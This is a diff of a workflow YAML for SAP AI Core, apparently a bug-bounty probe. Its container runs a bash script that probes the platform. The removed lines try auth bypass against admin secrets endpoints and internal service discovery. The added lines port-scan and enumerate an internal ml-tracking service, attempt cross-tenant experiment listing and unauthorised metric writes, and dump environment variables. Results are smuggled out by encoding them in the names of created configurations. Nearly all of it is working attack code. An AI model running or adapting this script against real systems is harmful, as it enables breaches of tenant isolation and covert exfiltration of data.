@@ -10,7 +10,7 @@ metadata:
   labels:
     scenarios.ai.sap.com/id: "bb14-scenario"
     executables.ai.sap.com/id: "bb14-probe"
-    ai.sap.com/version: "53.0.0"
+    ai.sap.com/version: "54.0.0"
 spec:
   entrypoint: main
   templates:
@@ -20,18 +20,11 @@ spec:
         ai.sap.com/resourcePlan: starter
     container:
       image: nicolaka/netshoot:latest
-      env:
-      - name: AICORE_EXECUTION_ID
-        value: "fake-exec-id"
-      - name: AICORE_TRACKING_ENDPOINT
-        value: "https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com/v2"
-      - name: SKIP_AUTHORIZATION
-        value: "true"
       command:
       - bash
       - -c
       - |
-        # V53: Test auth bypass via env vars + internal tracking API
+        # V54: Hit the REAL internal tracking API at ml-tracking-service
         AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
         API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
         CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
@@ -42,81 +35,73 @@ spec:
           | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)
 
         save() {
-          local name="v53-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
+          local name="v54-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
           curl -sk -X POST "${API}/v2/lm/configurations" \
             -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
             -H "Content-Type: application/json" \
             -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
         }
 
-        # 1. Test public API WITHOUT auth header (from inside cluster)
-        echo "=== NO-AUTH API ===" >&2
-        R=$(curl -sk --connect-timeout 5 "${API}/v2/admin/secrets" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-        save "noauth-secrets-$(echo $R | head -c 150)"
+        # The real tracking endpoint injected by platform
+        TRACK="http://ml-tracking-service.ml-tracking.svc.cluster.local"
+        TRACK_IP=$(dig +short "ml-tracking-service.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
+        save "track-ip-${TRACK_IP:-NXDOMAIN}"
 
-        R=$(curl -sk --connect-timeout 5 "${API}/v2/lm/executions" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-        save "noauth-execs-$(echo $R | head -c 150)"
+        # 1. Hit the tracking API root
+        echo "=== TRACKING ROOT ===" >&2
+        R=$(curl -sk --connect-timeout 5 "${TRACK}/" 2>&1 | head -c 200)
+        save "track-root-$(echo $R | head -c 150)"
 
-        R=$(curl -sk --connect-timeout 5 "${API}/v2/admin/repositories" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-        save "noauth-repos-$(echo $R | head -c 150)"
-
-        # 2. Test with empty Authorization header
-        R=$(curl -sk --connect-timeout 5 "${API}/v2/admin/secrets" -H "Authorization: " -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-        save "emptyauth-secrets-$(echo $R | head -c 150)"
-
-        # 3. Test internal tracking API endpoints
-        echo "=== TRACKING API ===" >&2
-        # Try the known internal hostname from SDK
-        TRACKING="api.ai.sec-eu10.mlfprod.internal.live.k8s.ondemand.com"
-        R=$(curl -sk --connect-timeout 5 "https://${TRACKING}/api/v1" 2>&1 | head -c 200)
-        save "tracking-v1-$(echo $R | head -c 150)"
-
-        R=$(curl -sk --connect-timeout 5 "https://${TRACKING}/v2/lm/executions" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-        save "tracking-execs-$(echo $R | head -c 150)"
-
-        # 4. Try ml-tracking namespace services
-        for svc in ml-tracking tracking-server mlflow; do
-          ip=$(dig +short "${svc}.ml-tracking.svc.cluster.local" 2>/dev/null | head -1)
-          if [ -n "$ip" ]; then
-            save "ml-track-dns-${svc}-${ip}"
-            R=$(curl -sk --connect-timeout 3 "http://${ip}:80/" 2>&1 | head -c 150)
-            save "ml-track-${svc}-80-$(echo $R | head -c 100)"
-            R=$(curl -sk --connect-timeout 3 "http://${ip}:5000/" 2>&1 | head -c 150)
-            save "ml-track-${svc}-5000-$(echo $R | head -c 100)"
+        # 2. Common MLflow/tracking API paths
+        for path in /api/v1 /api/2.0/mlflow /api/2.0/mlflow/experiments/list /api/2.0/mlflow/runs/search /api/2.0/mlflow/registered-models/list /api/v1/experiments /api/v1/runs /health /healthz /version /metrics; do
+          R=$(curl -sk --connect-timeout 3 "${TRACK}${path}" 2>&1 | head -c 200)
+          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out\|reset"; then
+            SAFEPATH=$(echo "$path" | tr '/' '-')
+            save "track${SAFEPATH}-$(echo $R | head -c 130)"
           fi
         done
 
-        # 5. Try the API via internal K8s service DNS (bypass external gateway)
-        echo "=== INTERNAL API ===" >&2
-        # The API might have an internal service name
-        for svc in ai-core-api api-server ml-api-facade resource-group-manager; do
-          for ns in aicore ml-api-facade; do
-            ip=$(dig +short "${svc}.${ns}.svc.cluster.local" 2>/dev/null | head -1)
-            if [ -n "$ip" ]; then
-              save "intapi-${svc}-${ns}-${ip}"
-              # Try accessing admin endpoints without auth via internal service
-              R=$(curl -sk --connect-timeout 3 "http://${ip}:80/v2/admin/secrets" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-              save "intapi-${svc}-secrets-$(echo $R | head -c 150)"
-              R=$(curl -sk --connect-timeout 3 "http://${ip}:8080/v2/admin/secrets" -H "AI-Resource-Group: default" 2>&1 | head -c 200)
-              save "intapi-${svc}-8080-$(echo $R | head -c 150)"
-            fi
-          done
-        done
+        # 3. Try with execution ID header (might scope data)
+        EXEC_ID=$(printenv AICORE_EXECUTION_ID 2>/dev/null)
+        save "real-exec-id-${EXEC_ID}"
 
-        # 6. Try resource-group-manager directly (found in V51 KSM data)
-        echo "=== RG MANAGER ===" >&2
-        RGM_IP=$(dig +short "resource-group-manager.aicore.svc.cluster.local" 2>/dev/null | head -1)
-        save "rgm-ip-${RGM_IP:-NXDOMAIN}"
-        if [ -n "$RGM_IP" ]; then
-          for port in 80 8080 8443; do
-            R=$(curl -sk --connect-timeout 3 "http://${RGM_IP}:${port}/" 2>&1 | head -c 200)
-            save "rgm-${port}-$(echo $R | head -c 150)"
+        # Try listing ALL experiments (cross-tenant test)
+        R=$(curl -sk --connect-timeout 5 "${TRACK}/api/2.0/mlflow/experiments/list" -H "X-Execution-Id: ${EXEC_ID}" 2>&1 | head -c 200)
+        save "track-experiments-$(echo $R | head -c 150)"
+
+        # 4. Try different ports
+        if [ -n "$TRACK_IP" ]; then
+          for port in 80 8080 5000 3000 9090 8888; do
+            R=$(curl -sk --connect-timeout 2 "http://${TRACK_IP}:${port}/" 2>&1 | head -c 150)
+            if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out\|reset"; then
+              save "track-port-${port}-$(echo $R | head -c 100)"
+            fi
           done
         fi
 
-        # 7. Check what env vars the container actually has (AICORE_* injected by platform?)
-        echo "=== ENV ===" >&2
-        AICORE_VARS=$(env | grep -i "AICORE\|AI_CORE\|SAP\|SKIP_AUTH" | tr '\n' '|')
-        save "env-aicore-${AICORE_VARS}"
+        # 5. Try posting a metric (write access test)
+        R=$(curl -sk --connect-timeout 5 -X POST "${TRACK}/api/v1/metrics" \
+          -H "Content-Type: application/json" \
+          -d '{"execution_id":"'${EXEC_ID}'","metrics":[{"name":"test_metric","value":1.0,"step":0}]}' 2>&1 | head -c 200)
+        save "track-write-$(echo $R | head -c 150)"
 
-        echo "V53 DONE" >&2
+        # 6. SAP-specific tracking API (not standard MLflow)
+        for path in /v1/metrics /v1/executions /v1/tracking /v2/lm/metrics; do
+          R=$(curl -sk --connect-timeout 3 "${TRACK}${path}" 2>&1 | head -c 200)
+          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out\|reset"; then
+            SAFEPATH=$(echo "$path" | tr '/' '-')
+            save "sap-track${SAFEPATH}-$(echo $R | head -c 130)"
+          fi
+        done
+
+        # 7. Also check what other env vars the platform injected
+        ALL_ENV=$(env | sort | grep -iv "password\|secret\|key\|CSC\|CID" | head -40 | tr '\n' '|')
+        # Split into chunks
+        echo "$ALL_ENV" | head -c 200 | while IFS= read -r chunk; do
+          save "env-1-${chunk}"
+        done
+        echo "$ALL_ENV" | tail -c 200 | while IFS= read -r chunk; do
+          save "env-2-${chunk}"
+        done
+
+        echo "V54 DONE" >&2
